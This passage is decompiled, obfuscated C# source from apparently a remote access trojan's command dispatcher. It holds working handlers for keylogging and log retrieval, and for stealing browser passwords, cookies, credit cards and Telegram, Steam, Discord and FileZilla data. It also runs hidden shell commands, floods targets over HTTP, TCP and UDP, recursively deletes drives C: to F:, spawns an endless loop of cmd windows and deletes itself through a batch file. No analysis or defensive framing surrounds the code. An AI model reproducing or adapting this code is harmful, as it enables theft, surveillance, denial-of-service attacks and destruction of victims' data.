									DecoratorReaderMapper decoratorReaderMapper = new DecoratorReaderMapper
									{
										["N"] = ParserFilterResolver._0001(process.ProcessName + ".exe"),
										["T"] = ParserFilterResolver._0001(process.MainWindowTitle + " "),
										["I"] = ParserFilterResolver._0001(process.Id + " ")
									};
									try
									{
										decoratorReaderMapper["P"] = ParserFilterResolver._0001(Publisher.VerifyFilter(process));
									}
									catch
									{
										decoratorReaderMapper["P"] = ParserFilterResolver._0001("Memory");
									}
									instanceClassDispatcher.Add(decoratorReaderMapper);
								}
								DispatcherInstanceExpression.InitFilter(this._0001, "processes", instanceClassDispatcher.SetClass((TimeState)0, new BroadcasterError[0]), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2720131176u:
							if (text2 == "keylogger")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (DecoratorReaderMapper.PatchRequest(_0004)["Action"].ResetClass<string>())
								{
								case "Start":
									if (!Directory.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent)))
									{
										Directory.CreateDirectory(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent));
									}
									new Thread((ThreadStart)delegate
									{
										//Discarded unreachable code: IL_0002
										//IL_0003: Incompatible stack heights: 0 vs 1
										Collection.NewEvent(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\");
									}).Start();
									break;
								case "Stop":
									Collection.ForgotEvent();
									break;
								case "List":
								{
									string text7 = "";
									if (Directory.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent)))
									{
										string[] files = Directory.GetFiles(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent), "*." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent), SearchOption.TopDirectoryOnly);
										foreach (string path in files)
										{
											text7 = text7 + Path.GetFileNameWithoutExtension(path) + "\r\n";
										}
									}
									DispatcherInstanceExpression.ManageFilter("keyloggerlist", text7, this._0002, _0003);
									break;
								}
								case "Get":
									if (!File.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\" + DecoratorReaderMapper.PatchRequest(_0004)["Date"].ResetClass<string>() + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent)))
									{
										throw new Exception("No log.");
									}
									DispatcherInstanceExpression.CustomizeFilter(File.ReadAllBytes(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\" + DecoratorReaderMapper.PatchRequest(_0004)["Date"].ResetClass<string>() + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent)), "keyloggerdata", this._0002, _0003);
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 858606679u:
							if (text2 == "stealer")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "Scanning directory...", this._0002, _0003);
								string text6 = DecoratorReaderMapper.PatchRequest(_0004)["searchpath"].ResetClass<string>();
								if (text6.Length < 1)
								{
									text6 = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\";
								}
								DispatcherInstanceExpression.CustomizeFilter(new Context().CalculateEvent(text6, DecoratorReaderMapper.PatchRequest(_0004)["cookies"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["passwords"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["forms"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["history"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["cc"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["telegram"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["steam"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["discord"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["filezilla"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["screenshot"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["clipboard"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["sysinfo"].ResetClass<bool>()), "stealer", this._0002, _0003);
								GC.Collect();
								Thread.Sleep(3000);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2722888107u:
							if (text2 == "chat")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (DecoratorReaderMapper.PatchRequest(_0004)["Action"].ResetClass<string>())
								{
								case "Open":
									if (MappingListAnnotation.m_ConfigurationEvent == 0)
									{
										MappingListAnnotation.m_ConfigurationEvent = new RepositoryEvent().PopList(111111, 99999999);
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											Application.Run(new InitializerBroadcasterDispatcher());
										}).Start();
									}
									break;
								case "Close":
									if (MappingListAnnotation.m_ConfigurationEvent != 0)
									{
										MappingListAnnotation.m_ConfigurationEvent = 0;
									}
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2030368611u:
							if (text2 == "RD")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (DecoratorReaderMapper.PatchRequest(_0004)["Action"].ResetClass<string>())
								{
								case "Start":
									Definition.ComputeEvent(DecoratorReaderMapper.PatchRequest(_0004)["monitor"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(_0004)["compression"].ResetClass<int>(), DecoratorReaderMapper.PatchRequest(_0004)["mouse"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(_0004)["keyboard"].ResetClass<bool>(), this._0002, _0003);
									break;
								case "Stop":
									Definition.DestroyEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3512644761u:
							if (text2 == "uninstall")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								try
								{
									string[] array = File.ReadAllText(Path.Combine(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(GlobalIssuerImporter.SetList() + GlobalIssuerImporter.RemoveList()) + ".tmp")).Split(new string[1]
									{
										"<$>"
									}, StringSplitOptions.None);
									string text3 = "";
									string[] array2 = array;
									foreach (string text4 in array2)
									{
										if (File.Exists(text4))
										{
											text3 = text3 + "del /a /q /f \"" + text4 + "\"\r\n";
											text3 = text3 + "del /a /q /f \"" + Path.GetDirectoryName(text4) + "\\" + ClassEvent.RegisterFilter(Path.GetFileName(text4)) + "\"\r\n";
										}
									}
									foreach (object[] item in instance)
									{
										try
										{
											MethodInfo methodInfo = (MethodInfo)item[0];
											methodInfo.Invoke(item[1], new object[3]
											{
												this._0002,
												_0003,
												MappingListAnnotation.m_PolicyEvent
											});
										}
										catch
										{
										}
									}
									string text5 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "B51zMRz72Y" + ".bat";
									string contents = "@echo off\r\nchcp 65001\r\nping -n 10 localhost > nul\r\n" + text3 + "del /a /q /f \"" + text5 + "\"";
									File.WriteAllText(text5, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
									ProcessStartInfo startInfo = new ProcessStartInfo
									{
										WindowStyle = ProcessWindowStyle.Hidden,
										UseShellExecute = true,
										FileName = text5
									};
									DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
									Process.Start(startInfo);
									File.Delete(Path.Combine(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(GlobalIssuerImporter.SetList() + GlobalIssuerImporter.RemoveList()) + ".tmp"));
								}
								catch
								{
								}
								Environment.Exit(0);
								Application.Exit();
								return;
							}
							break;
						}
					}
					DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
					if (list.ContainsKey(this._0001))
					{
						MethodInfo methodInfo2 = (MethodInfo)list[this._0001][0];
						methodInfo2.Invoke(list[this._0001][1], new object[4]
						{
							_0004,
							this._0002,
							_0003,
							MappingListAnnotation.m_PolicyEvent
						});
					}
					DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
				}
				catch (Exception ex)
				{
					DispatcherInstanceExpression.CancelFilter(this._0001, ex.Message, this._0002, _0003);
					Thread.Sleep(3000);
					DispatcherInstanceExpression.CancelFilter(this._0001, "#ERROR", this._0002, _0003);
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				Clipboard.SetText(_0004);
			}
		}

		[CompilerGenerated]
		private sealed class _0002
		{
			public MessageBoxIcon _0001;

			public int _0002;

			public string _0003;

			public _0001 _0004;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0002()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				MessageBox.Show(DecoratorReaderMapper.PatchRequest(this._0004._0004)["text"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(this._0004._0004)["caption"].ResetClass<string>() + " ", MessageBoxButtons.OK, this._0001, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				_0003 CS_0024_003C_003E8__locals0 = new _0003
				{
					_0002 = this,
					_0001 = new string[12]
					{
						" Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
						"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
						"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
						"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
						"Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
						"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
						"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
						"Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
						"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
						"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
						"Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
						"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
					}
				};
				for (int i = 0; i < this._0002; i++)
				{
					new Thread((ThreadStart)delegate
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						try
						{
							TcpClient tcpClient = new TcpClient(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0002._0004._0004)["Host"].ResetClass<string>(), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0002._0004._0004)["Port"].ResetClass<string>()));
							string s = "POST / HTTP/1.1\r\nHost: " + DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0002._0004._0004)["Host"].ResetClass<string>() + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + CS_0024_003C_003E8__locals0._0001[new RepositoryEvent().MoveList(CS_0024_003C_003E8__locals0._0001.Length)] + "\r\nContent-length: 5235\r\n\r\n";
							byte[] bytes = Encoding.UTF8.GetBytes(s);
							tcpClient.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
						}
						catch
						{
						}
					}).Start();
					Thread.Sleep(10);
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0003()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				_0004 CS_0024_003C_003E8__locals0 = new _0004
				{
					_0002 = new IPEndPoint(IPAddress.Parse(DecoratorReaderMapper.PatchRequest(this._0004._0004)["Host"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(this._0004._0004)["Port"].ResetClass<string>())),
					_0001 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
				};
				for (int i = 0; i < this._0002; i++)
				{
					new Thread((ThreadStart)delegate
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						try
						{
							CS_0024_003C_003E8__locals0._0001.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], CS_0024_003C_003E8__locals0._0002);
						}
						catch
						{
						}
					}).Start();
					Thread.Sleep(10);
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0004()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				_0005 CS_0024_003C_003E8__locals0 = new _0005
				{
					_0002 = new IPEndPoint(IPAddress.Parse(DecoratorReaderMapper.PatchRequest(this._0004._0004)["Host"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(this._0004._0004)["Port"].ResetClass<string>())),
					_0001 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp)
				};
				for (int i = 0; i < this._0002; i++)
				{
					new Thread((ThreadStart)delegate
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						try
						{
							CS_0024_003C_003E8__locals0._0001.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], CS_0024_003C_003E8__locals0._0002);
						}
						catch
						{
						}
					}).Start();
					Thread.Sleep(10);
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0005()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				this._0003 = Clipboard.GetText(TextDataFormat.UnicodeText);
			}
		}

		[CompilerGenerated]
		private sealed class _0003
		{
			public string[] _0001;

			public _0002 _0002;

			public ThreadStart _0003;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0003()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					TcpClient tcpClient = new TcpClient(DecoratorReaderMapper.PatchRequest(_0002._0004._0004)["Host"].ResetClass<string>(), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0002._0004._0004)["Port"].ResetClass<string>()));
					string s = "POST / HTTP/1.1\r\nHost: " + DecoratorReaderMapper.PatchRequest(_0002._0004._0004)["Host"].ResetClass<string>() + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + this._0001[new RepositoryEvent().MoveList(this._0001.Length)] + "\r\nContent-length: 5235\r\n\r\n";
					byte[] bytes = Encoding.UTF8.GetBytes(s);
					tcpClient.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
				}
				catch
				{
				}
			}
		}

		[CompilerGenerated]
		private sealed class _0004
		{
			public Socket _0001;

			public IPEndPoint _0002;

			public ThreadStart _0003;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0004()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					this._0001.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], _0002);
				}
				catch
				{
				}
			}
		}

		[CompilerGenerated]
		private sealed class _0005
		{
			public Socket _0001;

			public IPEndPoint _0002;

			public ThreadStart _0003;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0005()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					this._0001.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], _0002);
				}
				catch
				{
				}
			}
		}

		[Serializable]
		[CompilerGenerated]
		private sealed class FacadeWriterProperty
		{
			public static readonly FacadeWriterProperty systemWriter;

			public static ThreadStart algoWriter;

			public static ThreadStart _AdapterWriter;

			public static ThreadStart m_ListenerWriter;

			public static ThreadStart rulesWriter;

			[MethodImpl(MethodImplOptions.NoInlining)]
			static FacadeWriterProperty()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				systemWriter = new FacadeWriterProperty();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public FacadeWriterProperty()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					Directory.Delete("C:\\", recursive: true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete("D:\\", recursive: true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete("E:\\", recursive: true);
				}
				catch
				{
				}
				try
				{
					Directory.Delete("F:\\", recursive: true);
				}
				catch
				{
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				while (true)
				{
					Process.Start(new ProcessStartInfo
					{
						UseShellExecute = true,
						FileName = "cmd.exe",
						Arguments = "/c start cmd.exe /c \"pause\" & pause",
						WindowStyle = ProcessWindowStyle.Normal
					});
				}
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0003()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				Collection.NewEvent(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\");
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0004()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				Application.Run(new InitializerBroadcasterDispatcher());
			}
		}

		public static Dictionary<string, object[]> list;

		public static List<object[]> instance;

		public static List<object[]> dic;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void PatchRecord(string def, string pol, string tag, string task2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			MessageBoxIcon icon = default(MessageBoxIcon);
			int num2 = default(int);
			string ord = default(string);
			new Thread((ThreadStart)delegate
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					string text = def;
					string text2 = text;
					if (text2 != null)
					{
						switch (_0012._0003._0001(text2))
						{
						case 989868607u:
							if (text2 == "msgbox")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								icon = MessageBoxIcon.None;
								switch (DecoratorReaderMapper.PatchRequest(pol)["type"].ResetClass<string>())
								{
								case "INFORMATION":
									icon = MessageBoxIcon.Asterisk;
									break;
								case "WARNING":
									icon = MessageBoxIcon.Exclamation;
									break;
								case "CONFIRMATION":
									icon = MessageBoxIcon.Question;
									break;
								case "ERROR":
									icon = MessageBoxIcon.Hand;
									break;
								}
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									MessageBox.Show(DecoratorReaderMapper.PatchRequest(pol)["text"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(pol)["caption"].ResetClass<string>() + " ", MessageBoxButtons.OK, icon, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
								}).Start();
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3880313276u:
							if (text2 == "taskkill")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process[] processesByName = Process.GetProcessesByName(pol.Split('.')[0]);
								foreach (Process process3 in processesByName)
								{
									process3.Kill();
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1915076192u:
							if (text2 == "taskstart")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								ProcessWindowStyle windowStyle = ProcessWindowStyle.Normal;
								switch (DecoratorReaderMapper.PatchRequest(pol)["windowstyle"].ResetClass<string>())
								{
								case "Hidden":
									windowStyle = ProcessWindowStyle.Hidden;
									break;
								case "Minimized":
									windowStyle = ProcessWindowStyle.Minimized;
									break;
								case "Maximized":
									windowStyle = ProcessWindowStyle.Maximized;
									break;
								}
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = DecoratorReaderMapper.PatchRequest(pol)["file"].ResetClass<string>(),
									Arguments = DecoratorReaderMapper.PatchRequest(pol)["args"].ResetClass<string>(),
									WorkingDirectory = Path.GetDirectoryName(DecoratorReaderMapper.PatchRequest(pol)["file"].ResetClass<string>()),
									Verb = DecoratorReaderMapper.PatchRequest(pol)["verb"].ResetClass<string>(),
									WindowStyle = windowStyle
								});
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 300022785u:
							if (text2 == "shell")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "cmd.exe",
									Arguments = "/c " + pol,
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 4134661990u:
							if (text2 == "cddrive")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (pol)
								{
								case "Open":
									Publisher.DefineEvent(isinstance: true);
									break;
								case "Close":
									Publisher.DefineEvent(isinstance: false);
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2725776009u:
							if (text2 == "speak")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer();
								speechSynthesizer.SpeakAsync(pol);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 627698714u:
							if (text2 == "keyboardrecorder")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								SendKeys.SendWait(pol);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 399549159u:
							if (text2 == "ddos")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								num2 = Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Requests"].ResetClass<string>());
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									string[] array3 = new string[12]
									{
										" Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
										"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
										"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
										"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
										"Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
										"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
										"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
										"Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
										"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
										"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
										"Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
										"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
									};
									for (int num3 = 0; num3 < num2; num3++)
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											try
											{
												TcpClient tcpClient = new TcpClient(DecoratorReaderMapper.PatchRequest(pol)["Host"].ResetClass<string>(), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Port"].ResetClass<string>()));
												string s = "POST / HTTP/1.1\r\nHost: " + DecoratorReaderMapper.PatchRequest(pol)["Host"].ResetClass<string>() + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + array3[new RepositoryEvent().MoveList(array3.Length)] + "\r\nContent-length: 5235\r\n\r\n";
												byte[] bytes = Encoding.UTF8.GetBytes(s);
												tcpClient.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
											}
											catch
											{
											}
										}).Start();
										Thread.Sleep(10);
									}
								}).Start();
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									IPEndPoint remoteEP2 = new IPEndPoint(IPAddress.Parse(DecoratorReaderMapper.PatchRequest(pol)["Host"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Port"].ResetClass<string>()));
									Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
									for (int n = 0; n < num2; n++)
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											try
											{
